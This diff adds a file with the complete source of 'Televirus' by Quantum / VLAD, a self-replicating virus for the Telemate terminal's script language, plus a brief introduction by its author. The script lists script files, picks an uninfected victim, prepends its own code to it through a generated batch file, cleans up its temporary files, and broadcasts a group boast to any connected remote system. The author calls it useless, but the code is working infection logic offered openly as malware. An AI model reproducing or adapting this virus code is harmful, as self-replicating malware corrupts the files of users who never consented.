@@ -1,0 +1,61 @@
+
+Televirus by Quantum / VLAD
+---------------------------
+
+Below you will find a virus written in telemate script language.  You will
+agree that it is useless.  The user would have to be blind to not notice
+a slow down at the startup of telemate as the virus shells to dos numerous
+times.  If the script is run while the user is connected it will send a
+message to the remote computer otherwise it will echo it to the user.
+
+
+logpause
+QUERY DirScript,scrdir
+set SwapToDisk,off
+set SwapToEms,off
+set MaxDosShell,off
+chdir scrdir
+DOS "dir /b *.scr > random.fil"
+open "random.fil"
+gotvirus = 0
+gotvictim = 0
+repeat
+read s
+tell filepos
+open s
+read ts
+ss="copy /Y "
+concat ss,s
+if ts = "logpause"
+if gotvirus=0
+concat ss," virus.tmp > NULL"
+gotvirus = 1
+DOS ss
+endif
+else
+concat ss," victim.tmp > NULL"
+gotvictim = 1
+victimname=s
+DOS ss
+endif
+open "random.fil"
+seek filepos
+until gotvirus and gotvictim
+ss="copy /Y virus.tmp + victim.tmp "
+concat ss,victimname
+concat ss," > NULL"
+create "hookme.bat"
+write "@echo off"
+write ss
+write "del victim.tmp > NULL"
+write "del virus.tmp > NULL"
+write "del random.fil > NULL"
+close
+DOS "hookme.bat > NULL"
+DOS "del hookme.bat > NULL"
+PRINT "Quantum / VLAD in da house!!!!!!!!!"
+if CONNECTED
+PUT "Quantum / VLAD in da house!!!!!!!!!"
+endif
+logresume
+
